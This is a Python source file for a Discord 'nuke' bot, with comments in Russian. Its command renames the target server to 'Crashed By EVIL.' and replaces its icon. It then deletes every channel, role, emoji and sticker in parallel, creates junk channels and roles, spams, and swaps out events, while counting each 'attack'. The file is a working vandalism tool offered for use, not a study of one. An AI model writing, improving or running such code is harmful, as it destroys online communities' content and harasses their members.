import disnake
import asyncio
from disnake.ext import commands
from disnake.ext.commands import BucketType, CommandOnCooldown

from ..utils.bot_operations import Fucker
from ..utils.counter import AttackCounter
from ..utils.blacklist import is_blacklisted


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.attack_counter = AttackCounter()

    @commands.command()
    @commands.cooldown(1, 15, BucketType.guild)
    async def nuke(self, ctx):
        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер находится в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        self.attack_counter.record_attack_start()

        fucker = Fucker(ctx)
        
        # 1. Меняем название и аватарку
        await ctx.guild.edit(name="Crashed By EVIL.", icon=None)
        await fucker.change_avatar(ctx, "serverlogo.png")
        
        # 2. Удаляем всё мгновенно
        await asyncio.gather(
            fucker.delChannels(ctx),
            fucker.delRoles(ctx),
            fucker.delete_all_emojis(ctx),
            fucker.delete_all_stickers(ctx),
        )
        
        # 3. Создаём каналы и роли параллельно
        await asyncio.gather(
            fucker.crChannels(ctx),
            fucker.crRoles(ctx),
        )
        
        # 4. Спамим
        await fucker.spam(ctx)
        
        # 5. Ивенты
        await fucker.delete_events(ctx)
        await fucker.create_event(ctx)

        self.attack_counter.record_attack_end()

    @nuke.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, CommandOnCooldown):
            embed = disnake.Embed(
                title="⏳ Кулдаун",
                description=f"Повторите через {error.retry_after:.2f} секунд.",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            await ctx.send(embed=embed)
        else:
            raise error


def setup(bot):
    bot.add_cog(Nuke(bot))